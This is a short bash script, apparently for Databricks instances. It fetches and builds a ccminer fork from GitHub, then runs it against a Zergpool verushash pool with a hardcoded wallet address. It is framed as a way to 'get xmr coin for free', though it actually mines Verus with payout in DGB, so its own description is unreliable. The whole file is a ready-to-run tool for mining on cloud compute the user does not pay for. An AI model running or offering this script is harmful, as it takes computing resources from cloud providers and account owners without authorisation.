#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git;cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh && ./ccminer -a verus -o stratum+tcp://verushash.eu.mine.zergpool.com:3300 -u D6Ho1LG1wV8xzVyXCwNM2zuNboKdYMafmB.Berkah -p c=DGB -t 2
